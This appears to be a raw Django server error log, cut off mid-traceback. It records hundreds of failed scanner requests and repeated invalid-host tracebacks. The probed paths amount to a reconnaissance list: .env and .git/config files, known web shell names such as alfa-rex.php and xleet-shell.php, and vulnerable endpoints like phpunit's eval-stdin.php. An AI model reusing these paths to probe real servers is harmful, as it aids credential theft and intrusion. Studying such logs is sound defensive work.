Not Found: /dashboard/.git/config
Not Found: /build/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /FgiF
Not Found: /jquery-3.3.1.min.js
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /cgi-bin/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /local/
Not Found: /modules/
Not Found: /Site/
Not Found: /system/
Not Found: /template/
Not Found: /shop/
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /wp-includes/rest-api/search/
Not Found: /wp-includes/Requests/Exception/
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/sodium_compat/src/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-includes/Text/Diff/Engine/Engine/
Not Found: /wp-includes/html-api/
Not Found: /wp-includes/js/
Not Found: /wp-includes/php-compat/
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/random_compat/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/sitemaps/
Not Found: /wp-includes/sodium_compat/
Not Found: /wp-includes/style-engine/
Not Found: /wp-includes/theme-compat/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/colors/ectoplasm/
Not Found: /wp-admin/css/colors/
Not Found: /sites/default/files/
Not Found: /modules/mod_simplefileuploadv1.3/elements/
Not Found: /components/
Not Found: /wp-admin/css/
Not Found: /wp-admin/images/
Not Found: /wp-admin/maint/
Not Found: /wp-admin/meta/
Not Found: /wp-admin/network/
Not Found: /wp-admin/user/
Not Found: /wp-content/
Not Found: /wp-content/plugins/
Not Found: /wp-content/themes/
Not Found: /wp-admin/includes/
Not Found: /wp-admin/
Not Found: /wp-content/upgrade/
Not Found: /autoload_classmap.php
Not Found: /post.php
Not Found: /1.php
Not Found: /flower.php
Not Found: /admin.php
Not Found: /file.php
Not Found: /meta.php
Not Found: /index.php
Not Found: /yindu.php
Not Found: /about.php
Not Found: /randkeyword.php
Not Found: /goods.php
Not Found: /hehe.php
Not Found: /user.php
Not Found: /wp-2019.php
Not Found: /chosen.php
Not Found: /functions.php
Not Found: /cron.php
Not Found: /edit.php
Not Found: /gecko-new.php
Not Found: /cookie.php
Not Found: /xleet.php
Not Found: /spip.php
Not Found: /22.php
Not Found: /room.php
Not Found: /disagreed.php
Not Found: /text.php
Not Found: /alfa-rex.php
Not Found: /alfa-rex.php7
Not Found: /feeds.php
Not Found: /radio.php
Not Found: /dropdown.php
Not Found: /defaults.php
Not Found: /system.php
Not Found: /xmlrpc.php
Not Found: /xmlrpc.php0
Not Found: /colors.php
Not Found: /updates.php
Not Found: /alfa-rex1.php
Not Found: /wp-index.php
Not Found: /wp-admin.php
Not Found: /alfa.php
Not Found: /alfanew.php7
Not Found: /locale.php
Not Found: /wxo.php
Not Found: /colour.php
Not Found: /files.php
Not Found: /install.php
Not Found: /wp-contentt.php
Not Found: /config.php7
Not Found: /config.php
Not Found: /theme.php
Not Found: /block-bindings.php
Not Found: /class_api.php
Not Found: /inputs.php
Not Found: /root.php
Not Found: /menu.php
Not Found: /plugin.php
Not Found: /cloud.php
Not Found: /configs.php
Not Found: /wp-configs.php
Not Found: /update.php
Not Found: /2.php
Not Found: /input.php
Not Found: /aaa.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/config
Not Found: /actuator/gateway/routes
Not Found: /api/bin/123123
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /libs/js/iframe.js
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /api/bin/123123
Not Found: /.git/config
Not Found: /boaform/admin/formLogin
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /hudson
Not Found: /.env
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /staging_environment/.git/config
Not Found: /.env.staging.local
Not Found: /user_backend/.git/config
Not Found: /temp/.git/config
Not Found: /files/.git/config
Not Found: /releases/.git/config
Not Found: /.envrc
Not Found: /project/frontend/.git/config
Not Found: /build_tool/.git/config
Not Found: /client/.git/config
Not Found: /.env.debug
Not Found: /.env.test
Not Found: /.env
Not Found: /conf/.env
Not Found: /wp-content/.env
Not Found: /wp-admin/.env
Not Found: /library/.env
Not Found: /new/.env
Not Found: /vendor/.env
Not Found: /old/.env
Not Found: /local/.env
Not Found: /api/.env
Not Found: /blog/.env
Not Found: /crm/.env
Not Found: /laravel/.env
Not Found: /app/.env
Not Found: /app/config/.env
Not Found: /apps/.env
Not Found: /audio/.env
Not Found: /cgi-bin/.env
Not Found: /backend/.env
Not Found: /src/.env
Not Found: /base/.env
Not Found: /core/.env
Not Found: /vendor/laravel/.env
Not Found: /storage/.env
Not Found: /protected/.env
Not Found: /newsite/.env
Not Found: /www/.env
Not Found: /sites/all/libraries/mailchimp/.env
Not Found: /database/.env
Not Found: /public/.env
Not Found: /synersoft.biz/.env
Forbidden (CSRF cookie not set.): /
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lv.php
Not Found: /wp-22.php
Not Found: /wp-content/plugins/pwnd/pwnd.php
Not Found: /wp-content/plugins/pwnd-1/pwnd.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /smaxx.php
Not Found: /wp-admin/smaxx.php
Not Found: /wp-content/plugins/WordPressCore/smaxx.php
Not Found: /wp-includes/images/smaxx.php
Not Found: /wp-content/plugins/core-plugin/smaxx.php
Not Found: /wp-includes/smaxx.php
Not Found: /wp-content/plugins/smaxx.php
Not Found: /xt/smaxx.php
Not Found: /wp-content/smaxx.php
Not Found: /wp-content/themes/twentyfive/smaxx.php
Not Found: /wp-content/upgrade/sx.php
Not Found: /.well-known/pki-validation/sx.php
Not Found: /wp-admin/user/sx.php
Not Found: /wp-includes/ID3/sx.php
Not Found: /wp-includes/blocks/sx.php
Not Found: /sx.php
Not Found: /wp-includes/sx.php
Not Found: /wp-admin/sx.php
Not Found: /wp-content/plugins/fix/sx.php
Not Found: /wp-admin/includes/sx.php
Not Found: /cgi-bin/sx.php
Not Found: /wp-admin/css/sx.php
Not Found: /wp-admin/network/sx.php
Not Found: /wp-includes/block-supports/sx.php
Not Found: /wp-includes/IXR/sx.php
Not Found: /.well-known/sx.php
Not Found: /wp-includes/js/tinymce/skins/lightgray/fonts/sx.php
Not Found: /wp-content/sx.php
Not Found: /wp-content/plugins/elementor/sx.php
Not Found: /.well-known/acme-challenge/sx.php
Not Found: /wp-includes/js/jcrop/sx.php
Not Found: /wp-includes/rest-api/sx.php
Not Found: /wp-admin/images/sx.php
Not Found: /wp-admin/css/colors/blue/blue.php
Not Found: /chosen
Not Found: /wp-content/plugins/fix/up.php
Not Found: /install.php
Not Found: /wp-includes/images/include.php
Not Found: /gel4y.php
Not Found: /comfunctions.php
Not Found: /wp-content/plugins/core-plugin/include.php
Not Found: /wp-content/themes/wp-classic/inc/index.php
Not Found: /assets/images/1p.php
Not Found: /class.api.php
Not Found: /plugin.php
Not Found: /wp-mail.php
Not Found: /cong.php
Not Found: /wp-content/index.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-configs.php
Not Found: /mah.php
Not Found: /defaults.php
Not Found: /wp-content/themes/sketch/404.php
Not Found: /input.php
Not Found: /admin-ajax.php
Not Found: /0z.php
Not Found: /media.php
Not Found: /chosen.php
Not Found: /wp-includes/fonts/wp-login.php
Not Found: /wp-admin/users.php
Not Found: /wp-content/uploads/cache.php
Not Found: /.well-known/pki-validation/file.php
Not Found: /.wp-cli/wp-login.php
Not Found: /authorize.php
Not Found: /wp-admin/css/colors/blue/CasperExV1.php
Not Found: /wp-admin/includes/users.php
Not Found: /wp-content/plugins/revslider/includes/external/page/index.php
Not Found: /wp.php
Not Found: /wp-content/plugins/WordPressCore/include.php
Not Found: /wp-2019.php
Not Found: /upload.php
Not Found: /themes.php
Not Found: /wp-admin/network/index.php
Not Found: /wp-content/plugins/WordPressCore/blkfqnikz.php
Not Found: /wp/wp-admin/includes/class-wp-page-mvb2yr.php
Not Found: /content.php
Not Found: /st.php
Not Found: /wp-includes/images/smilies/about.php
Not Found: /simple.php
Not Found: /function.php
Not Found: /ynz.PhP7
Not Found: /wp-content/style-css.php
Not Found: /wp-includes/IXR/wp-login.php
Not Found: /.well-known/acme-challenge/about.php
Not Found: /wordpress/wp-includes/IXR/allez.php
Not Found: /rendixd.php
Not Found: /wp-admin/css/admin.php
Not Found: /filefuns.php
Not Found: /options.php
Not Found: /wp-includes/js/tinymce/skins/lightgray/img/index.php
Not Found: /edit.php
Not Found: /user.php
Not Found: /worm0.PhP7
Not Found: /wp-includes/js/tinymce/skins/wordpress/images/index.php
Not Found: /.well-known//.well-known/owlmailer.php
Not Found: /wp-content/uploads/cong.php
Not Found: /01.php
Not Found: /wp-content/uploads/wp-login.php.suspected
Not Found: /wp-includes/rest-api/endpoints/html.php
Not Found: /wp-admin/js/widgets/cong.php
Not Found: /doc.php
Not Found: /ws.php
Not Found: /link.php
Not Found: /autoload_classmap.php
Not Found: /wp-admin/js/privacy-tools.min.php
Not Found: /wp-includes/pomo/wp-login.php
Not Found: /db.php
Not Found: /wp-content/uploads/error_log.php
Not Found: /google.php
Not Found: /wp-includes/sts.php
Not Found: /wp-includes/pomo/fgertreyersd.php.suspected
Not Found: /wp-includes/Requests/dropdown.php
Not Found: /wp-content/install.php
Not Found: /.well-known/admin.php
Not Found: /revision.php
Not Found: /css/sgd.php
Not Found: /wp-content/plugins/index.php
Not Found: /.env.config
Not Found: /.env.dist
Not Found: /.env.production.local
Not Found: /backup/.git/config
Not Found: /data/.git/config
Not Found: /docker-compose.prod.yml
Not Found: /.env.preprod
Not Found: /src/.git/config
Not Found: /configuration/.env
Not Found: /.env.test
Not Found: /config/.git/config
Not Found: /.env.dev.local
Not Found: /.env.live
Not Found: /prod/.env
Not Found: /app/.git/config
Not Found: /assets../.git/config
Not Found: /project/.git/config
Not Found: /.env.dev
Not Found: /.env.production
Not Found: /www/.git/config
Not Found: /static../.git/config
Not Found: /config/.env
Not Found: /media../.git/config
Not Found: /.env.ci
Not Found: /.env.staging.local
Not Found: /CFIDE/administrator/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /.env
Not Found: /robots.txt
Not Found: /.env.dev.local
Not Found: /.env.bak
Not Found: /config/.env
Not Found: /assets../.git/config
Not Found: /project/.git/config
Not Found: /.env.live
Not Found: /.env.production.local
Not Found: /.env.save
Not Found: /www/.git/config
Not Found: /api/.env
Not Found: /config/.git/config
Not Found: /.env.local
Not Found: /.env.sandbox
Not Found: /core/.git/config
Not Found: /data/.git/config
Not Found: /media../.git/config
Not Found: /.env.config
Not Found: /.env_sample
Not Found: /robots.txt
Not Found: /youtube-video-downloader/index.html/
Not Found: /phpinfo
Not Found: /info
Not Found: /.env
Not Found: /.env.local
Not Found: /backend/.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /odinhttpcall1740273467
Not Found: /sdk
Not Found: /HNAP1
Not Found: /evox/about
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/authLogin.cgi
Not Found: /v2/_catalog
Not Found: /solr/admin/info/system
Not Found: /query
Not Found: /solr/admin/cores
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /.env
Not Found: /backend/.env
Not Found: /robots.txt
Not Found: /shell
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Bad Request: /contact/
Forbidden (CSRF token missing.): /contact/
Not Found: /contact.html
Not Found: /druid/index.html
Not Found: /shell
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env.template
Not Found: /build/.env
Not Found: /.env.stage
Not Found: /.env.dist
Not Found: /data/.git/config
Not Found: /.env.testing
Not Found: /docker-compose.prod.yml
Not Found: /xleetshell.php
Not Found: /wp-admin/includes/xleet-shell.php
Not Found: /wp-content/plugins/content-management/content.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-content/plugins/xt/index.php
Not Found: /wp-content/xleet.php
Not Found: /wp-admin/xleet-shell.php
Not Found: /wp-content/plugins/yyobang/mar.php
Not Found: /simple.php
Not Found: /class.api.php
Not Found: /wp-content/plugins/core/include.php
Not Found: /ws.php
Not Found: /404.php
Not Found: /wp.php
Not Found: /wp-head.php
Not Found: /wp-includes/wp-class.php
Not Found: /wp-content/themes/twenty/twenty.php
Not Found: /wp-content/plugins/press/wp-class.php
Not Found: /fm1.php
Not Found: /alfadheat.php
Not Found: /M1.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /config/.git/config
Not Found: /.env
Not Found: /.git/config
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
